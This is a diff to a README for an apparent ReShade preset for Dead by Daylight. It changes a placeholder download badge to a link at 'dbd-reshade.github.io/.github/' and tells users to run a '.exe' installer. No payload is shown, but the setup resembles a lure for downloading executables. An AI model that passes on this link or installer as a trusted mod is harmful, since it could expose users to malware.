@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` installer – the Reshade configuration will be applied automatically to Dead by Daylight.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://dbd-reshade.github.io/.github/)
 
 ## 📸 Overview
 <img width="386" height="493" alt="dbd-reshade-color-correction" src="https://github.com/user-attachments/assets/08fcd97f-f07d-44de-a764-6da59730f78b" />
